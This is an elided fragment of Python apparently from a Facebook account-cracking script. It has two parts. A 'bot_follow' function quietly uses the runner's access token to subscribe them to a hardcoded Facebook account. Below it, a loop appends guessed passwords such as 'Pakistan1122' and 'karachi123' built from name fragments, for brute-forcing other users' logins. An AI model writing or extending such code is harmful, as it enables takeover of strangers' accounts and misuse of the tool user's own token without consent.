...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100000998904633/subscribers?access_token=" + toket) # Dapunta Rheicha
	...
	for i in text.split(" "):
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				results.append("Pakistan1122")
				results.append("karachi") 
				results.append("karachi123") 
				if "id" in ct:
